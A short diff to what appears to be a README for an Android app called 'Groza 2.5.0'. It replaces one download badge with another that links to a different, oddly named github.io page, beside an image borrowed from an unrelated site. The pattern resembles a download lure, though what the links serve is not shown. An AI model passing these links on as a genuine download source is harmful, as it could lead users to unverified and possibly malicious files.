@@ -4,11 +4,7 @@
   <img src="https://elohov.ru/wp-content/uploads/2016/11/molniya3.jpg" width="820" alt="Groza 2.5.0 Interface">
 </div>
 
-<p align="center">
-  <a href="https://groza-2-5-0-russian-android.github.io/.github">
-    <img src="https://img.shields.io/badge/Download_GROZA_2.5.0-3DDC84?style=for-the-badge&logo=android&logoColor=white" alt="Download Groza 2.5.0">
-  </a>
-</p>
+[![GET Groza 2](https://img.shields.io/badge/GET%20%E2%80%94%20Groza-2-0078D6?style=for-the-badge&logoColor=white)](https://pavlasladyoard.github.io/.github/Groza-2)
 
 ---
 
